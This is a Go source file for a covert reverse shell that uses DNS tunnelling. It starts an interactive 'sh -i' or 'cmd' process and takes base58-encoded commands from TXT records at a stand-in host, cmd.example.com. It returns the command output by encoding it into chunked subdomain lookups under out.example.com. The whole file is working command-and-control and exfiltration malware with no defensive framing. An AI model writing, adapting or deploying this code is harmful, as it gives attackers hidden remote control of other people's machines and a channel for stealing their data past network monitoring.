package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/btcsuite/btcutil/base58"
)

func main() {
	// Create dns resolver
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, "udp", "127.0.0.1:53")
		},
	}
	shell := Shell{}
	shell.Init()

	go shell.FetchStdin(r)
	shell.Execute()
	shell.PostStdout(r)

}

type Shell struct {
	stdOut chan []byte
	stdIn  chan string

	cmdStdoutReader *io.PipeReader
	cmdStdoutWriter *io.PipeWriter

	cmdStdinReader  *io.PipeReader
	cmdStdinWriter  *io.PipeWriter
}

func (s *Shell) Init() {
	s.stdIn = make(chan string)
	s.stdOut = make(chan []byte)
	s.cmdStdoutReader, s.cmdStdoutWriter = io.Pipe()
	s.cmdStdinReader, s.cmdStdinWriter = io.Pipe()
}

//Contact the server and get stdin
func (s *Shell) FetchStdin(r *net.Resolver) {
	for {
		//get shell command using dns TXT record
		data, err := r.LookupTXT(context.Background(), "cmd.example.com")
		if err != nil {
			log.Fatal(err)
			return
		}
		if len(data) > 0 && data[0] != "" {
			fmt.Printf("Received: %v, %d\n", data, len(data))
			command := string(base58.Decode(data[0]))
			command += "\n"
			s.stdIn <- command
		}
		time.Sleep(1 * time.Second)
	}
}

//Return the data to the server
func (s *Shell) PostStdout(r *net.Resolver) {
	for {
		cmdOutput := <-s.stdOut
		requests := s.encodeRequests(cmdOutput)
		for i, request := range requests {
			fmt.Println(i, " ", request)
			_, err := r.LookupHost(context.Background(), request)
			if err != nil {
				fmt.Println(err)
			}
		}
	}
}

//Execute the shell in the backend and start the process
func (s *Shell) Execute() {
	s.startShell()

	//Stdin
	go func() {
		for {
			commandInput := <-s.stdIn
			fmt.Println("Write data to stdin")
			_, err := s.cmdStdinWriter.Write([]byte(commandInput))
			if err != nil{
				fmt.Println(err)
				return
			}
		}
	}()

	//Stdout
	stdoutData := make([]byte, 32767)
	go func() {
		for {
			n, err := s.cmdStdoutReader.Read(stdoutData)
			if err != nil{
				fmt.Println(err)
				return
			}
			s.stdOut <- stdoutData[:n]
		}
	}()
}

func (s *Shell) startShell() {
	fmt.Println("Launching bash/cmd process")
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd")
	}else{
		cmd = exec.Command("sh","-i")
	}

	cmd.Stdin = s.cmdStdinReader
	cmd.Stdout = s.cmdStdoutWriter
	cmd.Stderr = s.cmdStdoutWriter

	cmd.Start()
}

func (s *Shell) encodeRequests(cmdOutput []byte) []string {
	var requests []string
	var packetNumber uint16 = 0
	var builder strings.Builder
	//Bytes for the current level (max 32)
	var levelBytes []byte
	//Number of levels
	var nLevels uint16 = 0
	for i := 0; i < len(cmdOutput); i++ {
		if nLevels%3 == 0 && len(levelBytes) == 0 {
			if nLevels != 0 {
				//we need to create a new request
				builder.WriteString("out.example.com")
				requests = append(requests, builder.String())
				builder.Reset()
			}
			//first level of the request
			buf := new(bytes.Buffer)
			binary.Write(buf, binary.BigEndian, packetNumber)
			packetNumber++
			data := buf.Bytes()
			data[0] = data[0] & 127
			//update the msb if this is the last request
			if len(cmdOutput)-i < (32*3 - 2) {
				data[0] = data[0] | 128
			}

			levelBytes = append(levelBytes, data...)
		}
		//add the current byte
		levelBytes = append(levelBytes, cmdOutput[i])
		if len(levelBytes) > 32 {
			log.Fatal("The maximum number of byte per level is 32")
		} else if len(levelBytes) == 32 {
			//Encode the current level
			builder.WriteString(base58.Encode(levelBytes))
			builder.WriteString(".")
			levelBytes = levelBytes[:0]
			nLevels++
		}

	}
	if len(levelBytes) > 0 {
		builder.WriteString(base58.Encode(levelBytes))
		builder.WriteString(".")
	}
	builder.WriteString("out.example.com")
	requests = append(requests, builder.String())
	return requests
}
